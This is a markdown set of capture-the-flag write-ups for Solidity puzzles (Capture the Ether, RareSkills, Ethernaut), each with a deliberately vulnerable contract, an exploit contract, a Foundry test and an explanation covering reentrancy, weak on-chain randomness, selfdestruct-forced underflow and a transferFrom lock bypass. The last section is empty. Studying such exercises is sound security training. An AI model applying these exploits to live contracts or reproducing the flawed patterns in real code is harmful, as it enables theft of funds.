# CTF Write Ups

## Capture the Ether Foundry (RareSkills): Guess the Secret Number
Link: https://github.com/RareSkills/capture-the-ether-foundry/tree/master/GuessNewNumber

### Contracts
- `src/Week8-9/GuessSecretNumber.sol`
```
contract GuessTheSecretNumber {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool) {
        require(msg.value == 1 ether);

        if (keccak256(abi.encodePacked(n)) == answerHash) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to Send 2 ether");
        }
        return true;
    }
}

contract ExploitContract {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    //If keccak256(abi.encodePacked(n)) == answerHash, then n will be the correct number
    function Exploiter() public view returns (uint8) {
        uint8 n;
        uint8 uint8MaxValue = type(uint8).max; //255

        //range of uint8 == 0 to 255 inclusive.
        for (uint8 i = 0; i <= uint8MaxValue; i++) {
            if (keccak256(abi.encodePacked(i)) == answerHash) {
                n = i;
                break;
            }
        }
        return n;
    }
}
```
- `test/Week8-9/GuessSecretNumber.t.sol`
```
contract GuessSecretNumberTest is Test {
    ExploitContract exploitContract;
    GuessTheSecretNumber guessTheSecretNumber;

    function setUp() public {
        // Deploy "GuessTheSecretNumber" contract and deposit one ether into it
        guessTheSecretNumber = (new GuessTheSecretNumber){value: 1 ether}();

        // Deploy "ExploitContract"
        exploitContract = new ExploitContract();
    }

    function testFindSecretNumber() public {
        // Put solution here
        uint8 secretNumber = exploitContract.Exploiter();
        _checkSolved(secretNumber);
    }

    function _checkSolved(uint8 _secretNumber) internal {
        assertTrue(guessTheSecretNumber.guess{value: 1 ether}(_secretNumber), "Wrong Number");
        assertTrue(guessTheSecretNumber.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```

### Exploit
The exploit here is pretty straightforward. In the victim contract, `guess` takes a `uint8` argument and generates a hash based on that value, and sends 2 Ether to the msg.sender if that hash matches the stored hash. Since the hash is based on a `uint8` type, and the max value for `uint8` is merely 255, we can easily recreate the hashing step in the attacking contract and brute-force the correct value that matches the `answerHash`. The `Exploiter` function just has to run a loop and create hashes from 0 to 255 until it finds the matching hash from the correct number.

## Capture the Ether Foundry (RareSkills): Guess the New Number
Link: https://github.com/RareSkills/capture-the-ether-foundry/tree/master/GuessNewNumber

### Contracts
- `src/Week8-9/GuessNewNumber.sol`
```
contract GuessNewNumber {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool pass) {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Fail to send to msg.sender");
            pass = true;
        }
    }
}

contract ExploitContract {
    GuessNewNumber public guessNewNumber;
    uint8 public answer;

    function Exploit() public returns (uint8) {
        //if this gets called in the same block number and timestamp as `guess`, then the answers will be the same
        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        return answer;
    }
}
```

- `test/Week8-9/GuessNewNumber.t.sol`
```
contract GuessNewNumberTest is Test {
    GuessNewNumber public guessNewNumber;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        guessNewNumber = (new GuessNewNumber){value: 1 ether}();
        exploitContract = new ExploitContract();
    }

    function testNumber(uint256 blockNumber, uint256 blockTimestamp) public {
        // Prevent zero inputs
        vm.assume(blockNumber != 0);
        vm.assume(blockTimestamp != 0);
        // Set block number and timestamp
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Place your solution here
        uint8 answer = exploitContract.Exploit();
        _checkSolved(answer);
    }

    function _checkSolved(uint8 _newNumber) internal {
        assertTrue(guessNewNumber.guess{value: 1 ether}(_newNumber), "Wrong Number");
        assertTrue(guessNewNumber.isComplete(), "Balance is supposed to be zero");
    }

    receive() external payable {}
}
```

### Exploit
In the victim contract, `answer` is a `uint8` value obtained from downcasting the `uint256` cast of the hash output (byte string) of `keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))`. This means that `answer` is technically the value of the most insignificant byte of the 32 byte hash.
```
➜ uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
Type: uint
├ Hex: 0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49

➜ uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))))
Type: uint
├ Hex: 0x0000000000000000000000000000000000000000000000000000000000000049
```
However this is not consequential to the exploit. We can simply recreate the hashing step in the attacking contract and recreate `answer`; and initiate the attack within the same `block.number` and `block.timestamp`.

## Capture the Ether Foundry (RareSkills): Predict The Future
Link: https://github.com/RareSkills/capture-the-ether-foundry/tree/master/PredictTheFuture

### Contracts
- `src/Week8-9/PredictTheFuture.sol`
```
contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    // Write your exploit code below:
    uint8 exploitGuess;

    receive() external payable {}

    function lockInGuess(uint8 n) public payable {
        require(n < 10);
        exploitGuess = n;
        predictTheFuture.lockInGuess{value: 1 ether}(n);
    }

    function attack() public {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(answer == exploitGuess);
        predictTheFuture.settle();
    }
}
```
- `test/Week8-9/PredictTheFuture.t.sol`
```
contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here:
        vm.deal(address(exploitContract), 1 ether);
        exploitContract.lockInGuess(0);

        vm.roll(104295);

        while (!predictTheFuture.isComplete()) {
            try exploitContract.attack() {
                break;
            } catch {
                vm.roll(block.number + 1);
            }
        }

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```

### Exploit
In the victim contract, for `settle` to be called successfully, `answer` must be equals to the `guess` storage variable that was stored when `lockInGuess` was called. Since the storage variables are not marked public, they will not be accessible by the attacking contract. So in the attacking contract, we can utilize a tracker: `exploitGuess` to track the value we pass into the victim contract's `lockInGuess` to initiate the attack. Additionally, `answer` has a `% 10` operation so this means that `answer` will always be a value in the range of: 0 - 9; so for an attack to work, `lockInGuess` should be called with a value in the same range.

One tricky aspect of `settle` is that it requires `msg.sender == guesser`, and it will always reset `guesser` to `address(0)` when it is called - regardless of whether `answer` matches `guess`. The only time the function will revert is when it fails to send ether to the msg.sender when the answer is correct. So the attack cannot allow `guesser` to be reset, otherwise we have to call `lockInGuess` again and this will also reset the value stored in `guess`.

We can replicate the hashing step of the victim contract in the attacking contract, and compare the value it returns to `exploitGuess` which is the value we initially set as `guess` in the victim contract when calling `lockInGuess`. If the return value does not match `exploitGuess`, we will intentionally revert the transaction so that `settle` does not reset `guesser` and by extension reset `guess`. The `settle` function can thus be brute-forced to get the correct answer by running `attack` with either a different `block.numer` and/or `block.timestamp` until the answer is correct.

## RareSkills Solidity Riddles: Overmint1-ERC1155
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Overmint1-ERC1155.sol

### Contracts
- `src/Week8-9/Overmint1-ERC1155.sol`
```
contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;

    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

contract ExploitContract is ERC1155Holder {
    Overmint1_ERC1155 public overmint1_ERC1155;

    constructor(Overmint1_ERC1155 _overmint1_ERC1155) {
        overmint1_ERC1155 = _overmint1_ERC1155;
    }

    function attack() public {
        overmint1_ERC1155.mint(0, "");
    }

    function complete() public {
        overmint1_ERC1155.safeTransferFrom(address(this), msg.sender, 0, 5, "");
    }

    function onERC1155Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*id*/
        uint256, /*value*/
        bytes memory /*data*/
    )
        public
        virtual
        override
        returns (bytes4)
    {
        //Reenter victim contract.
        //To complete, we need exactly 5 tokens
        if (overmint1_ERC1155.balanceOf(address(this), 0) != 5) {
            overmint1_ERC1155.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }
}
```
- `test/Week8-9/Overmint1-ERC1155.t.sol`
```
contract Overmint1_ERC1155_Test is Test {
    Overmint1_ERC1155 public overmint1_ERC1155;
    ExploitContract public exploitContract;
    address owner;
    address attackerWallet;

    function setUp() public {
        // Deploy contracts
        overmint1_ERC1155 = new Overmint1_ERC1155();
        exploitContract = new ExploitContract(overmint1_ERC1155);
        owner = address(this);
        attackerWallet = address(0xdead);
    }

    function testExploit() public {
        vm.prank(attackerWallet);
        exploitContract.attack();

        vm.prank(attackerWallet);
        exploitContract.complete();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(overmint1_ERC1155.balanceOf(address(attackerWallet), 0) == 5, "Challenge Incomplete");
        assertTrue(vm.getNonce(address(attackerWallet)) < 3, "must exploit in two transactions or less");
    }
}
```
### Exploit
For the attacking contract, we implement `ERC1155Holder` which implements the required `supportsInterface`, `onERC1155Received`, and `onERC1155BatchReceived` functions. This will allow us to override `onERC1155Received` in the exploit.

The `mint` function in the victim ERC1155 contract does not follow the checks-effects-interactions (CEI) pattern and it also does not have a reentrancy guard, so it is vulnerable to reentrancy. Under the hood, `_mint` calls `_updateWithAcceptanceCheck` which calls `_doSafeBatchTransferAcceptanceCheck` which in turn calls the `onERC1155Received` hook on the receiver if it is a contract. In the function body, `_mint` is called before the `amountMinted` storage variable is updated. This means that control will be handed over to the receiving contract when `_mint` is called before `amountMinted` can be updated to reflect the correct amount.

Thus in the attacking contract, when we initiate the attack by calling `overmint1_ERC1155.mint(0, "")`, the `onERC1155Received` hook with the code to reenter the `mint` function will be called. And this allows the attacking contract to mint multiple times in a single function call.

## Capture the Ether Foundry (RareSkills): Token Bank
Link: https://github.com/RareSkills/capture-the-ether-foundry/tree/master/TokenBank

### Contracts
- `src/Week8-9/TokenBank.sol`
```
interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes memory data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes memory data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;
    address public player;

    constructor(address _player) {
        token = new SimpleERC223Token();
        player = _player;
        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }
}

// Write your exploit contract below
contract TokenBankAttacker is ITokenReceiver {
    TokenBankChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = TokenBankChallenge(challengeAddress);
    }
    // Write your exploit functions here
    function depositToAttackContract(uint256 amount) public {
        challenge.token().transferFrom(msg.sender, address(this), amount);
    }

    function depositToTokenBank(uint256 amount) public {
        challenge.token().transfer(address(challenge), amount);
    }

    function attack(uint256 amount) public {
        challenge.withdraw(amount);
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        if (challenge.token().balanceOf(address(challenge)) > 0) {
            challenge.withdraw(value);
        }
    }
}
```
- `test/Week8-9/TokenBank.t.sol`
```
contract TokenBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    SimpleERC223Token public token;

    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
        token = tokenBankChallenge.token();

        // Put your solution here
        vm.startPrank(player);
        tokenBankChallenge.withdraw(500_000 * 10 ** 18);
        token.approve(address(tokenBankAttacker), type(uint256).max);
        uint256 playerBalance = token.balanceOf(player);
        tokenBankAttacker.depositToAttackContract(playerBalance);
        tokenBankAttacker.depositToTokenBank(playerBalance);
        tokenBankAttacker.attack(playerBalance);
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
```

### Exploit
The vulnerability lies in the TokenBankChallenge contract not following the CEI pattern in `withdraw` where control is passed to the `ITokenReceiver` recipient of a `transfer` before its balance is updated in the contract, a lack of reentrancy safeguards, and also the use of the `tokenFallback` hook in the recipient contract.

In the `SimpleERC223Token` contract, when a `transfer` is called and the `to` address is a contract, the function will call the `tokenFallback` hook of the receiving contract. This exposes a reentrancy attack vector where a malicious contract can implement the `tokenFallback` hook and reenter a victim contract on a `transfer` call. In this case, if the recipient of a `withdraw` function is a contract, it could utlize `tokenFallback` to call `withdraw` again.

To achieve the exploit, the `player` starts with 500,000 tokens in the `TokenBankChallenge` contract. This amount is withdrawn and deposited into the `TokenBankAttacker` contract. The `player` then calls the `depositToTokenBank` function in the attacking contract so that the `TokenBankAttacker` contracts transfers tokens to `TokenBankChallenge`. Due to the implementation of `tokenFallback` in `TokenBankChallenge`, this would allow the `TokenBankAttacker` contract to have a balance in the `TokenBankChallenge` contract instead of `player`. 

When `TokenBankAttacker` calls `withdraw` on `TokenBankChallenge`, tokens are transferred to `TokenBankAttacker`, so the `tokenFallback` function in `TokenBankAttacker` will be called, which in turn reenters `TokenBankChallenge` by calling `withdraw` again. This allows the attacking contract to drain the victim contract.

## Capture the Ether Foundry (RareSkills): Predict the Blockhash
Link: https://github.com/RareSkills/capture-the-ether-foundry/tree/master/PredictTheBlockhash

### Contracts
- `src/Week8-9/PredictTheBlockhash.sol`
```
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to create this contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");

        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}

// Write your exploit contract below
contract ExploitContract {
    PredictTheBlockhash public predictTheBlockhash;

    constructor(PredictTheBlockhash _predictTheBlockhash) {
        predictTheBlockhash = _predictTheBlockhash;
    }

    receive() external payable {}

    function lockInGuess() public payable {
        bytes32 _hash = blockhash(0);
        predictTheBlockhash.lockInGuess{value: 1 ether}(_hash);
    }

    function attack() public {
        predictTheBlockhash.settle();
    }
}
```
- `test/Week8-9/PredictTheBlockhash.t.sol`
```
contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;
        // To roll forward, add the number of blocks to blockNumber,
        // Eg. roll forward 10 blocks: blockNumber + 10
        console2.log(blockNumber);
        // Put your solution here
        exploitContract.lockInGuess{value: 1 ether}();
        vm.roll(blockNumber + 258);
        exploitContract.attack();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```
### Exploit
The exploit lies in the `blockhash` function. From the official Solidity documentation, `blockhash` returns a `bytes32` hash of the given block when the given block number argument is one of the 256 most recent blocks; otherwise returns zero. To add an additional point: it does not include the current block. To illustrate, if the current block number is 257, then `blockhash` can return the hashes of blocks 256 to 1; and if the current block number is 258, then `blockhash` can return the hashes of blocks 257 to 2. Any block that lies further than the most recent 256 blocks will return `0x0000000000000000000000000000000000000000000000000000000000000000`. Thus in the `PredictTheBlockhash` contract, the `settle` function is vulnerable once `setlementBlockNumber` is more than 256 blocks in the past, i.e. `block.number - settlementBlockNumber > 256`.

Since `lockInGuess` in the `PredictTheBlockhash` contract has no restrictions on the input value, we can intentionally set the hash to `blockhash(0)` which returns `0x00`. If this was called at block number 1, then the `settlementBlockNumber` will be 2 since `settlementBlockNumber = block.number + 1`, and `answer` will be `blockhash(2)`. So in this example, we just have to call `settle` at block number 259 and beyond, where `blockhash(2)` will return `0x00` since its out of the most recent 256 blocks. So long as we call `settle` at `blockNumber + 258`, it will work for any block number.

## Capture the Ether Foundry (RareSkills): Retirement Fund
Link: https://github.com/RareSkills/capture-the-ether-foundry/tree/master/RetirementFund

### Contracts
- `src/Week8-9/RetirementFund.sol`
```
contract RetirementFund {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 520 weeks;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
            require(ok, "Transfer to msg.sender failed");
        } else {
            (bool ok,) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);
        uint256 withdrawn = 0;
        unchecked {
            withdrawn += startBalance - address(this).balance;

            // an early withdrawal occurred
            require(withdrawn > 0);
        }

        // penalty is what's left
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    RetirementFund public retirementFund;

    constructor(RetirementFund _retirementFund) {
        retirementFund = _retirementFund;
    }

    // write your exploit functions below
    function forceSendEther() public {
        selfdestruct(payable(address(retirementFund)));
    }
}
```
- `test/Week8-9/RetirementFund.t.sol`
```
contract RetirementFundTest is Test {
    RetirementFund public retirementFund;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        retirementFund = (new RetirementFund){value: 1 ether}(address(this));
        exploitContract = new ExploitContract(retirementFund);
    }

    function testIncrement() public {
        vm.deal(address(exploitContract), 1 ether);
        // Test your Exploit Contract below
        // Use the instance retirementFund and exploitContract

        // Put your solution here
        exploitContract.forceSendEther();
        retirementFund.collectPenalty();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(retirementFund.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```

### Exploit
When `RetirementFund` is deployed in `RetirementFundTest`, both the `owner`` and `beneficiary`` of `RetirementFund` are the address of the `RetirementFundTest` contract. The `startBalance` of the victim contract becomes `1 ether`, and the balance of the victim contract also becomes `1 ether`.

The vulnerability is in the `collectPenalty` function, where there is an unchecked block. In order for `collectPenalty` to successfully transfer its balance to msg.sender, `withdrawn` needs to be more than 0. If we call `collectPenalty` right away, the require statement will cause the call to fail as `withdrawn` will only be 0 (`startBalance == 1` & `address(this).balance == 1`). Since we cant increment `startBalance`, the only way to make `withdrawn` more than 0 is to cause an underflow in the unchecked block. By getting `address(this).balance` to be any number slighlty over 1, the unchecked block will cause `withdrawn` to increment by an extremely large number, as `startBalance - address(this).balance` will wrap around 0.

Note that `RetirementFund` does not have a `receive` function, neither does it have a `fallback` function, or even a `payable` function. So the contract seemingly cannot receive any more ether. We can, however, use `selfdestruct` to forcefully send ether to the `RetirementFund` contract by calling `selfdestruct` and specifying `RetirementFund` as the target.

Thus for the exploit to work, we deploy `ExploitContract` and deal it with 1 ether. Then call `forceSendEther` which calls `selfdestruct` with `RetirementFund` as the target, and this forcefully sends the balance of `ExploitContract` to `RetirementFund`. The values of `startBalance` and `address(this).balance` in the victim contract will be 1 and 2 respectively, and now `require(withdrawn > 0)` will pass when `collectPenalty` is called because the underflow will occur in `startBalance - address(this).balance`. The end result will be the transfer of `RetirementFund`'s entire balance to msg.sender.

## Ethernaut: #15 Naught Coin
Link: https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F

### Contracts
- `src/Week8-9/Ethernaut_NaughtCoin.sol`
```
contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```
- `test/Week8-9/Ethernaur_NaughtCoin.t.sol`
```
contract NaughtCoinTest is Test {
    NaughtCoin naughtCoin;
    address player = address(this);
    address attacker = address(0xBad);

    function setUp() public {
        //player starts with 1_000_000 tokens with 10 year transfer lockout
        naughtCoin = new NaughtCoin(player);
    }

    function testExploit() public {
        vm.startPrank(player);
        naughtCoin.approve(attacker, 1000000 * 10 ** 18); // 1_000_000
        vm.stopPrank();

        vm.startPrank(attacker);
        naughtCoin.transferFrom(player, attacker, 1000000 * 10 ** 18); // 1_000_000
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(naughtCoin.balanceOf(player) == 0, "Challenge Incomplete");
    }
}
```

### Exploit
To complete this ctf, the token balance for `player` needs to be 0. The `NaughtCoin` contract implements ERC20 and overrides `transfer` with a timelock of 10 years for `player`, so `player` cant send tokens through the `transfer` function. However, the contract does not override ERC20's `transferFrom` function. So we can approve a spending allowance for `attacker`, and `attacker` can simply call `transferFrom` to transfer out `player`'s full token balance.

## Ethernaut: #20 Denial
Link: https://ethernaut.openzeppelin.com/level/0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6

### Contracts
- `src/Week8-9/Ethernaut_Denial.sol`
```
```
- `test/Week8-9/Ethernaur_Denial.t.sol`

### Exploit